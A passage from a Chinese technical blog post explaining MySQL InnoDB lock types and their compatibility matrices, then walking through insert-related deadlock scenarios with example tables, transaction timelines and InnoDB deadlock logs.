indicated type on table t):<br>Intention shared (IS): Transaction T intends to set S locks on individual rows in table t.<br>Intention exclusive (IX): Transaction T intends to set X locks on those rows.</p>\n</blockquote>\n<p>事务在请求S锁和X锁前，需要先获得对应的IS、IX锁。</p>\n<blockquote>\n<p>Before a transaction can acquire an S lock on a row in table t, it must first acquire an IS or stronger lock on t. Before a transaction can acquire an X lock on a row, it must first acquire an IX lock on t.</p>\n</blockquote>\n<p>意向锁产生的主要目的是为了处理行锁和表锁之间的冲突，用于表明“某个事务正在某一行上持有了锁，或者准备去持有锁”。</p>\n<blockquote>\n<p>The main purpose of IX and IS locks is to show that someone is locking a row, or going to lock a row in the table.</p>\n</blockquote>\n<p>共享锁、排他锁与意向锁的兼容矩阵如下：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">X</th>\n<th style=\"text-align:center\">IX</th>\n<th style=\"text-align:center\">S</th>\n<th style=\"text-align:center\">IS</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">X</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">IX</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">S</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\">兼容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">IS</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\">兼容</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>从官方文档字面意思上看意向锁是表级锁，但是大牛<strong>不认为</strong>“Intention lock 是表级锁”[^5]?<br>另外，由于意向锁主要用于解决行锁与表锁间冲突问题，鉴于平时表级操作特别少，在分析加锁过程是否可以不用过多考虑意向锁的问题?</p>\n<h3 id=\"3-行锁\"><a href=\"#3-行锁\" class=\"headerlink\" title=\"3. 行锁\"></a>3. 行锁</h3><h4 id=\"记录锁-Record-Locks\"><a href=\"#记录锁-Record-Locks\" class=\"headerlink\" title=\"记录锁(Record Locks)\"></a>记录锁(Record Locks)</h4><p>记录锁, 仅仅锁住索引记录的一行。<br>单条索引记录上加锁，record lock锁住的永远是索引，而非记录本身，即使该表上没有任何索引，那么innodb会在后台创建一个隐藏的聚集主键索引，那么锁住的就是这个隐藏的聚集主键索引。所以说当一条sql没有走任何索引时，那么将会在每一条聚集索引后面加X锁，这个类似于表锁，但原理上和表锁应该是完全不同的。</p>\n<p>参见官方文档[^3]：</p>\n<blockquote>\n<p>If the table has no PRIMARY KEY or suitable UNIQUE index, InnoDB internally generates a hidden clustered index on a synthetic column containing row ID values. The rows are ordered by the ID that InnoDB assigns to the rows in such a table. The row ID is a 6-byte field that increases monotonically as new rows are inserted. Thus, the rows ordered by the row ID are physically in insertion order.</p>\n</blockquote>\n<h4 id=\"间隙锁-Gap-Locks\"><a href=\"#间隙锁-Gap-Locks\" class=\"headerlink\" title=\"间隙锁(Gap Locks)\"></a>间隙锁(Gap Locks)</h4><p>区间锁, 仅仅锁住一个索引区间(开区间)。<br>在索引记录之间的间隙中加锁，或者是在某一条索引记录之前或者之后加锁，并不包括该索引记录本身。</p>\n<h4 id=\"next-key锁-Next-Key-Locks\"><a href=\"#next-key锁-Next-Key-Locks\" class=\"headerlink\" title=\"next-key锁(Next-Key Locks)\"></a>next-key锁(Next-Key Locks)</h4><p>record lock + gap lock, 左开右闭区间。</p>\n<blockquote>\n<p>A next-key lock is a combination of a record lock on the index record and a gap lock on the gap before the index record.</p>\n<p>By default, InnoDB operates in REPEATABLE READ transaction isolation level and with the innodb_locks_unsafe_for_binlog system variable disabled. In this case, InnoDB uses next-key locks for searches and index scans, which prevents phantom rows。</p>\n</blockquote>\n<p>默认情况下，innodb使用next-key locks来锁定记录。<br>但当查询的索引含有唯一属性的时候，Next-Key Lock 会进行优化，将其降级为Record Lock，即仅锁住索引本身，不是范围。</p>\n<h4 id=\"插入意向锁-Insert-Intention-Locks\"><a href=\"#插入意向锁-Insert-Intention-Locks\" class=\"headerlink\" title=\"插入意向锁(Insert Intention Locks)\"></a>插入意向锁(Insert Intention Locks)</h4><p>Gap Lock中存在一种插入意向锁（Insert Intention Lock），在insert操作时产生。在多事务同时写入不同数据至同一索引间隙的时候，并不需要等待其他事务完成，不会发生锁等待。<br>假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。</p>\n<blockquote>\n<p>An insert intention lock is a type of gap lock set by INSERT operations prior to row insertion. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6, respectively, each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.</p>\n</blockquote>\n<p><strong>注</strong>：插入意向锁并非意向锁，而是一种特殊的间隙锁。</p>\n<h3 id=\"4-行锁的兼容矩阵-4\"><a href=\"#4-行锁的兼容矩阵-4\" class=\"headerlink\" title=\"4. 行锁的兼容矩阵[^4]\"></a>4. 行锁的兼容矩阵[^4]</h3><table>\n<thead>\n<tr>\n<th></th>\n<th>Gap</th>\n<th>Insert Intention</th>\n<th>Record</th>\n<th>Next-Key</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Gap</strong></td>\n<td>兼容</td>\n<td>兼容</td>\n<td>兼容</td>\n<td>兼容</td>\n</tr>\n<tr>\n<td><strong>Insert Intention</strong></td>\n<td><code>冲突</code></td>\n<td>兼容</td>\n<td>兼容</td>\n<td><code>冲突</code></td>\n</tr>\n<tr>\n<td><strong>Record</strong></td>\n<td>兼容</td>\n<td>兼容</td>\n<td><code>冲突</code></td>\n<td><code>冲突</code></td>\n</tr>\n<tr>\n<td><strong>Next-Key</strong></td>\n<td>兼容</td>\n<td>兼容</td>\n<td><code>冲突</code></td>\n<td><code>冲突</code></td>\n</tr>\n</tbody>\n</table>\n<p><strong>表注</strong>：横向是已经持有的锁，纵向是正在请求的锁。</p>\n<p>由于S锁和S锁是完全兼容的，因此在判别兼容性时只考虑持有的锁与请求的锁是这三种组合情形：X、S和S、X和X、X。<br>另外，需要提醒注意的是进行兼容判断也只是针对于加锁涉及的行有交集的情形。</p>\n<p>分析兼容矩阵可以得出如下几个结论：</p>\n<ul>\n<li>INSERT操作之间不会有冲突。</li>\n<li>GAP,Next-Key会阻止Insert。</li>\n<li>GAP和Record,Next-Key不会冲突</li>\n<li>Record和Record、Next-Key之间相互冲突。</li>\n<li>已有的Insert锁不阻止任何准备加的锁。</li>\n</ul>\n<h3 id=\"5-自增锁-AUTO-INC-Locks\"><a href=\"#5-自增锁-AUTO-INC-Locks\" class=\"headerlink\" title=\"5. 自增锁(AUTO-INC Locks)\"></a>5. 自增锁(AUTO-INC Locks)</h3><p>AUTO-INC锁是一种特殊的表级锁，发生涉及AUTO_INCREMENT列的事务性插入操作时产生。</p>\n<p>官方解释如下[^3]：</p>\n<blockquote>\n<p>An AUTO-INC lock is a special table-level lock taken by transactions inserting into tables with AUTO_INCREMENT columns. In the simplest case, if one transaction is inserting values into the table, any other transactions must wait to do their own inserts into that table, so that rows inserted by the first transaction receive consecutive primary key values.</p>\n</blockquote>\n<h2 id=\"四、insert加锁过程\"><a href=\"#四、insert加锁过程\" class=\"headerlink\" title=\"四、insert加锁过程\"></a>四、insert加锁过程</h2><p>官方文档[^6]对于insert加锁的描述如下：</p>\n<blockquote>\n<p>INSERT sets an exclusive lock on the inserted row. This lock is an index-record lock, not a next-key lock (that is, there is no gap lock) and does not prevent other sessions from inserting into the gap before the inserted row.</p>\n<p>Prior to inserting the row, a type of gap lock called an insert intention gap lock is set. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6 each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.</p>\n<p>If a duplicate-key error occurs, a shared lock on the duplicate index record is set. This use of a shared lock can result in deadlock should there be multiple sessions trying to insert the same row if another session already has an exclusive lock.</p>\n</blockquote>\n<p>简单的insert会在insert的行对应的索引记录上加一个排它锁，这是一个record lock，并没有gap，所以并不会阻塞其他session在gap间隙里插入记录。</p>\n<p>不过在insert操作之前，还会加一种锁，官方文档称它为insertion intention gap lock，也就是意向的gap锁。这个意向gap锁的作用就是预示着当多事务并发插入相同的gap空隙时，只要插入的记录不是gap间隙中的相同位置，则无需等待其他session就可完成，这样就使得insert操作无须加真正的gap lock。<br>假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。</p>\n<p>假设发生了一个唯一键冲突错误，那么将会在重复的索引记录上加读锁。当有多个session同时插入相同的行记录时，如果另外一个session已经获得该行的排它锁，那么将会导致死锁。</p>\n<h3 id=\"思考：Insert-Intention-Locks作用\"><a href=\"#思考：Insert-Intention-Locks作用\" class=\"headerlink\" title=\"思考：Insert Intention Locks作用\"></a>思考：Insert Intention Locks作用</h3><p>Insert Intention Locks的引入，我理解是为了提高数据插入的并发能力。<br>如果没有Insert Intention Locks的话，可能就需要使用Gap Locks来代替。</p>\n<h2 id=\"五、insert死锁场景分析\"><a href=\"#五、insert死锁场景分析\" class=\"headerlink\" title=\"五、insert死锁场景分析\"></a>五、insert死锁场景分析</h2><p>接下来，带大家看几个与insert相关的死锁场景。</p>\n<h3 id=\"1-duplicate-key-error引发的死锁\"><a href=\"#1-duplicate-key-error引发的死锁\" class=\"headerlink\" title=\"1. duplicate key error引发的死锁\"></a>1. duplicate key error引发的死锁</h3><p>这个场景主要发生在两个以上的事务同时进行唯一键值相同的记录插入操作。</p>\n<h4 id=\"表结构\"><a href=\"#表结构\" class=\"headerlink\" title=\"表结构\"></a>表结构</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`aa`</span> (</div><div class=\"line\">  <span class=\"string\">`id`</span> <span class=\"built_in\">int</span>(<span class=\"number\">10</span>) <span class=\"keyword\">unsigned</span> <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'主键'</span>,</div><div class=\"line\">  <span class=\"string\">`name`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">''</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'姓名'</span>,</div><div class=\"line\">  <span class=\"string\">`age`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">'0'</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'年龄'</span>,</div><div class=\"line\">  <span class=\"string\">`stage`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">'0'</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'关卡数'</span>,</div><div class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`id`</span>),</div><div class=\"line\">  <span class=\"keyword\">UNIQUE</span> <span class=\"keyword\">KEY</span> <span class=\"string\">`udx_name`</span> (<span class=\"string\">`name`</span>),</div><div class=\"line\">  <span class=\"keyword\">KEY</span> <span class=\"string\">`idx_stage`</span> (<span class=\"string\">`stage`</span>)</div><div class=\"line\">) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">InnoDB</span> <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8;</div></pre></td></tr></table></figure>\n<h4 id=\"表数据\"><a href=\"#表数据\" class=\"headerlink\" title=\"表数据\"></a>表数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from aa;</div><div class=\"line\">+----+------+-----+-------+</div><div class=\"line\">| id | name | age | stage |</div><div class=\"line\">+----+------+-----+-------+</div><div class=\"line\">|  1 | yst  |  11 |     8 |</div><div class=\"line\">|  2 | dxj  |   7 |     4 |</div><div class=\"line\">|  3 | lb   |  13 |     7 |</div><div class=\"line\">|  4 | zsq  |   5 |     7 |</div><div class=\"line\">|  5 | lxr  |  13 |     4 |</div><div class=\"line\">+----+------+-----+-------+</div></pre></td></tr></table></figure>\n<h4 id=\"事务执行时序表\"><a href=\"#事务执行时序表\" class=\"headerlink\" title=\"事务执行时序表\"></a>事务执行时序表</h4><table>\n<thead>\n<tr>\n<th>T1(36727)</th>\n<th>T2(36728)</th>\n<th>T3(36729)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n<td>begin;</td>\n<td>begin;</td>\n</tr>\n<tr>\n<td>insert into aa values(6, ‘test’, 12, 3);</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>insert into aa values(6, ‘test’, 12, 3);</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>insert into aa values(6, ‘test’, 12, 3);</td>\n</tr>\n<tr>\n<td>rollback;</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</td>\n</tr>\n<tr>\n<td></td>\n<td>Query OK, 1 row affected (13.10 sec)</td>\n<td>&nbsp;</td>\n</tr>\n</tbody>\n</table>\n<p>如果T1未rollback，而是commit的话，T2和T3会报唯一键冲突：ERROR 1062 (23000): Duplicate entry ‘6’ for key ‘PRIMARY’</p>\n<h4 id=\"事务锁占用情况\"><a href=\"#事务锁占用情况\" class=\"headerlink\" title=\"事务锁占用情况\"></a>事务锁占用情况</h4><p>T1 rollback前，各事务锁占用情况：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from information_schema.innodb_locks;</div><div class=\"line\">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| lock_id      | lock_trx_id | lock_mode | lock_<span class=\"built_in\">type</span> | lock_table  | lock_index | lock_space | lock_page | lock_rec | lock_data |</div><div class=\"line\">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| 36729:24:3:7 | 36729       | S         | RECORD    | `<span class=\"built_in\">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</div><div class=\"line\">| 36727:24:3:7 | 36727       | X         | RECORD    | `<span class=\"built_in\">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</div><div class=\"line\">| 36728:24:3:7 | 36728       | S         | RECORD    | `<span class=\"built_in\">test</span>`.`aa` | PRIMARY    |         24 |         3 |        7 | 6         |</div><div class=\"line\">+--------------+-------------+-----------+-----------+-------------+------------+------------+-----------+----------+-----------+</div></pre></td></tr></table></figure></p>\n<p><strong>注</strong>：mysql有自己的一套规则来决定T2与T3哪个进行回滚，本文不做讨论。</p>\n<h4 id=\"死锁日志\"><a href=\"#死锁日志\" class=\"headerlink\" title=\"死锁日志\"></a>死锁日志</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">2016-07-21 19:34:23 700000a3f000</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 36728, ACTIVE 199 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">LOCK WAIT 4 lock struct(s), heap size 1184, 2 row lock(s)</div><div class=\"line\">MySQL thread id 13, OS thread handle 0x700000b0b000, query id 590 localhost root update</div><div class=\"line\">insert into aa values(6, <span class=\"string\">'test'</span>, 12, 3)</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`aa` trx id 36728 lock_mode X insert intention waiting</div><div class=\"line\">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</div><div class=\"line\"> 0: len 8; hex 73757072656d756d; asc supremum;;</div><div class=\"line\"></div><div class=\"line\">*** (2) TRANSACTION:</div><div class=\"line\">TRANSACTION 36729, ACTIVE 196 sec inserting</div><div class=\"line\">mysql tables <span class=\"keyword\">in</span> use 1, locked 1</div><div class=\"line\">4 lock struct(s), heap size 1184, 2 row lock(s)</div><div class=\"line\">MySQL thread id 14, OS thread handle 0x700000a3f000, query id 591 localhost root update</div><div class=\"line\">insert into aa values(6, <span class=\"string\">'test'</span>, 12, 3)</div><div class=\"line\">*** (2) HOLDS THE LOCK(S):</div><div class=\"line\">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`aa` trx id 36729 lock mode S</div><div class=\"line\">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</div><div class=\"line\"> 0: len 8; hex 73757072656d756d; asc supremum;;</div><div class=\"line\"></div><div class=\"line\">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 24 page no 3 n bits 80 index `PRIMARY` of table `<span class=\"built_in\">test</span>`.`aa` trx id 36729 lock_mode X insert intention waiting</div><div class=\"line\">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</div><div class=\"line\"> 0: len 8; hex 73757072656d756d; asc supremum;;</div><div class=\"line\"></div><div class=\"line\">*** WE ROLL BACK TRANSACTION (2)</div></pre></td></tr></table></figure>\n<h4 id=\"死锁成因\"><a href=\"#死锁成因\" class=\"headerlink\" title=\"死锁成因\"></a>死锁成因</h4><p>事务T1成功插入记录，并获得索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。<br>紧接着事务T2、T3也开始插入记录，请求排他插入意向锁(LOCK_X | LOCK_GAP | LOCK_INSERT_INTENTION)；但由于发生重复唯一键冲突，各自请求的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)转成共享记录锁(LOCK_S | LOCK_REC_NOT_GAP)。</p>\n<p>T1回滚释放索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)，T2和T3都要请求索引id=6上的排他记录锁(LOCK_X | LOCK_REC_NOT_GAP)。<br>由于X锁与S锁互斥，T2和T3都等待对方释放S锁。<br>于是，死锁便产生了。</p>\n<p>如果此场景下，只有两个事务T1与T2或者T1与T3，则不会引发如上死锁情况产生。</p>\n<h4 id=\"思考-1\"><a href=\"#思考-1\" class=\"headerlink\" title=\"思考\"></a>思考</h4><ul>\n<li><p>为什么发现重复主键冲突的时候，要将事务请求的X锁转成S锁？<br>(比较牵强的)个人理解，跟插入意向锁类型，也是为了提高插入的并发效率。</p>\n</li>\n<li><p>插入前请求插入意向锁的作用？<br>个人认为，通过兼容矩阵来分析，Insert Intention Locks是为了减少插入时的锁冲突。</p>\n</li>\n</ul>\n<h3 id=\"2-GAP与Insert-Intention冲突引发的死锁\"><a href=\"#2-GAP与Insert-Intention冲突引发的死锁\" class=\"headerlink\" title=\"2. GAP与Insert Intention冲突引发的死锁\"></a>2. GAP与Insert Intention冲突引发的死锁</h3><h4 id=\"表结构-1\"><a href=\"#表结构-1\" class=\"headerlink\" title=\"表结构\"></a>表结构</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`t`</span> (</div><div class=\"line\">  <span class=\"string\">`a`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span>,</div><div class=\"line\">  <span class=\"string\">`b`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"literal\">NULL</span>,</div><div class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`a`</span>),</div><div class=\"line\">  <span class=\"keyword\">KEY</span> <span class=\"string\">`idx_b`</span> (<span class=\"string\">`b`</span>)</div><div class=\"line\">) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">InnoDB</span> <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8;</div></pre></td></tr></table></figure>\n<h4 id=\"表数据-1\"><a href=\"#表数据-1\" class=\"headerlink\" title=\"表数据\"></a>表数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from t;</div><div class=\"line\">+----+------+</div><div class=\"line\">| a  | b    |</div><div class=\"line\">+----+------+</div><div class=\"line\">|  1 |    2 |</div><div class=\"line\">|  2 |    3 |</div><div class=\"line\">|  3 |    4 |</div><div class=\"line\">| 11 |   22 |</div><div class=\"line\">+----+------+</div></pre></td></tr></table></figure>\n<h4 id=\"事务执行时序表-1\"><a href=\"#事务执行时序表-1\" class=\"headerlink\" title=\"事务执行时序表\"></a>事务执行时序表</h4><table>\n<thead>\n<tr>\n<th>T1(36831)</th>\n<th>T2(36832)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n<td>begin;</td>\n</tr>\n<tr>\n<td>select * from t where b = 6 for update;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from t where b = 8 for update;</td>\n</tr>\n<tr>\n<td>insert into t values (4,5);</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>insert into t values (4,5);</td>\n</tr>\n<tr>\n<td></td>\n<td>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</td>\n</tr>\n<tr>\n<td>Query OK, 1 row affected (5.45 sec)</td>\n<td>&nbsp;</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"事务锁占用情况-1\"><a href=\"#事务锁占用情况-1\" class=\"headerlink\" title=\"事务锁占用情况\"></a>事务锁占用情况</h4><p>T2 insert前，各事务锁占用情况：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from information_schema.innodb_locks;</div><div class=\"line\">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| lock_id      | lock_trx_id | lock_mode | lock_<span class=\"built_in\">type</span> | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data |</div><div class=\"line\">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</div><div class=\"line\">| 36831:25:4:5 | 36831       | X,GAP     | RECORD    | `<span class=\"built_in\">test</span>`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |</div><div class=\"line\">| 36832:25:4:5 | 36832       | X,GAP     | RECORD    | `<span class=\"built_in\">test</span>`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |</div><div class=\"line\">+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+</div></pre></td></tr></table></figure></p>\n<h4 id=\"死锁日志-1\"><a href=\"#死锁日志-1\" class=\"headerlink\" title=\"死锁日志\"></a>死锁日志</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">------------------------</div><div class=\"line\">LATEST DETECTED DEADLOCK</div><div class=\"line\">------------------------</div><div class=\"line\">2016-07-28 12:28:34 700000a3f000</div><div class=\"line\">*** (1) TRANSACTION:</div><div class=\"line\">TRANSACTION 36831, ACTIVE 17 sec inserting</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">LOCK WAIT 4 lock struct(s), heap size 1184, 3 row lock(s), undo log entries 1</div><div class=\"line\">MySQL thread id 38, OS thread handle 0x700000b0b000, query id 953 localhost root update</div><div class=\"line\">insert into t values (4,5)</div><div class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36831 lock_mode X locks gap before rec insert intention waiting</div><div class=\"line\">Record lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000016; asc     ;;</div><div class=\"line\"> 1: len 4; hex 8000000b; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) TRANSACTION:</div><div class=\"line\">TRANSACTION 36832, ACTIVE 13 sec inserting</div><div class=\"line\">mysql tables in use 1, locked 1</div><div class=\"line\">3 lock struct(s), heap size 360, 2 row lock(s)</div><div class=\"line\">MySQL thread id 39, OS thread handle 0x700000a3f000, query id 954 localhost root update</div><div class=\"line\">insert into t values (4,5)</div><div class=\"line\">*** (2) HOLDS THE LOCK(S):</div><div class=\"line\">RECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36832 lock_mode X locks gap before rec</div><div class=\"line\">Record lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000016; asc     ;;</div><div class=\"line\"> 1: len 4; hex 8000000b; asc     ;;</div><div class=\"line\"></div><div class=\"line\">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</div><div class=\"line\">RECORD LOCKS space id 25 page no 3 n bits 72 index `PRIMARY` of table `test`.`t` trx id 36832 lock mode S locks rec but not gap waiting</div><div class=\"line\">Record lock, heap no 5 PHYSICAL RECORD: n_fields 4; compact format; info bits 0</div><div class=\"line\"> 0: len 4; hex 80000004; asc     ;;</div><div class=\"line\"> 1: len 6; hex 000000008fdf; asc       ;;</div><div class=\"line\"> 